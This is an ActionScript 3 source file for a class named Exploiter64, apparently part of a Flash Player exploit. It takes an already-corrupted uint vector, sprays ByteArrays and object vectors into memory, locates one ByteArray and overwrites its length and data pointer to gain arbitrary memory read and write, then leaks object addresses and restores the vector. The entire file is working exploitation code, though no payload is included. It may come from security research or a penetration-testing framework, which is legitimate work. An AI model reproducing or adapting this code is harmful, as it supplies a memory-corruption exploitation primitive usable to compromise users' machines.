package 
{
	import flash.utils.ByteArray
	
	public class Exploiter64 
	{
		private var ov:Vector.<Object> = new Vector.<Object>(2048)
		private var uv:Vector.<uint>
		private var uv_orig_length:uint
		
		private var ba_pos:uint
		private var ba_orig_array_hi:uint
		private var ba_orig_array_lo:uint
		private var ba_orig_length:uint
		private var ba_orig_capcity:uint
		private var ba:ByteArray
		
		private var BYTE_ARRAY_SIZE:Number = 0x3f8
		private var SEARCH_LIMIT:Number = 0x280000 / 4
		
		public function Exploiter64(corrupted_vector, original_length) 
		{
			uv_orig_length = original_length
			uv = corrupted_vector
			uv[0] = 0xdaadbaaf
			Logger.log("[*] uv corrupted length: " + uv.length.toString(16))
			
            for (var i:uint = 0; i < ov.length; i++) {
				if (i % 2 == 0) {
					ov[i] = new ByteArray()
					ov[i].length = 0x3f8
					ov[i].position = 0
					ov[i].endian = "littleEndian"
					ov[i].writeUnsignedInt(0xdeedbeef)
				} else {
					ov[i] = new Vector.<Object>(0x3f6)
					ov[i][0] = this
				}
			}
			
			try {
				search_byte_array()
			} catch (err:Error) {
				Logger.log('[!] ba not found')
				return
			}
			
			Logger.log("[*] Setting up new ba length")
			set_ba_length(0x1000)
            
			// 1) Find my bytearray
            for (i = 0; i < ov.length; i++) {
				if (ov[i].length == 0x1000) {
					ba = ov[i] as ByteArray
					ba.position = 0
					break
				}
			}
			
			if (ba == null) {
				Logger.log('[!] modified ba not found')
				return
			}
			
			Logger.log('[*] ba found')
			
			// 2) Search back from the ba buffer addr and try to find uv
			var uv_addr:uint = ba_orig_array_lo
			var leak:uint
			i = 0
			while (true) {
				leak = ba_read(uv_addr, ba_orig_array_hi)
				if (leak == 0xdaadbaaf) {
					uv_addr = uv_addr - 0x10
					break
				}
				uv_addr = uv_addr - 4
			}
			
			Logger.log("[*] uv found at 0x" + ba_orig_array_hi.toString(16) + '`' + uv_addr.toString(16))
			
			// 3) Search forward from the ba buffer addr and try to leak the 'this' address
			var this_addr:uint = ba_orig_array_lo
			leak = 0
			i = 0
			while (true) {
				leak = ba_read(this_addr, ba_orig_array_hi)
				if (leak == 0x3f6) {
					Logger.log('[*] Vector.<Object> found at 0x' + ba_orig_array_hi.toString(16) + '`' + this_addr.toString(16)) 
					this_addr = this_addr + 8
					this_addr = ba_read(this_addr, ba_orig_array_hi)
					this_addr = this_addr - 1
					break
				}
				this_addr = this_addr + 4
			}
			
			Logger.log("[*] 'this' found at 0x" + ba_orig_array_hi.toString(16) + '`' + this_addr.toString(16))
			
			// 4) Restore uv
			ba_write(uv_addr, ba_orig_array_hi, uv_orig_length)
			Logger.alert("Looks good:\n" +
				" 'this' addr: 0x" + ba_orig_array_hi.toString(16) + '`' + this_addr.toString(16) + "\n" +
				"     uv addr: 0x" + ba_orig_array_hi.toString(16) + '`' + uv_addr.toString(16) + "\n" +
				"restored len: " + uv.length.toString())
		}
		
		// Make ba_pos point to the *array ptr
		private function search_byte_array():void {
			for (var i:uint = 0; i < SEARCH_LIMIT; i++) {
                if (uv[i + 2] == 0x3f8 && uv[i + 3] == 0x3f8) {
					ba_orig_capcity = 0x3f8
					ba_orig_length = 0x3f8
					ba_orig_array_lo = uv[i]
					ba_orig_array_hi = uv[i + 1]
                    ba_pos = i
					return
                }
            }
            throw new Error() 
		}
		
		private function set_ba_length(new_length:uint):void {
			uv[ba_pos + 2] = new_length
			uv[ba_pos + 3] = new_length
		}
		
		private function set_ba_array(ptr_lo:uint, ptr_hi:uint):void {
			uv[ba_pos] = ptr_lo
			uv[ba_pos + 1] = ptr_hi
		}
		
		private function restore_ba():void {
			set_ba_array(ba_orig_array_lo, ba_orig_array_hi)
			set_ba_length(0x3f8)
		}
		
		private function ba_read(addr_lo:uint, addr_hi:uint):uint {
			set_ba_array(addr_lo, addr_hi)
			ba.position = 0
			return ba.readUnsignedInt()
		}
		
		private function ba_write(addr_lo:uint, addr_hi:uint, val:uint):void {
			set_ba_array(addr_lo, addr_hi)
			ba.position = 0
			ba.writeUnsignedInt(val)
		}
		
	}

}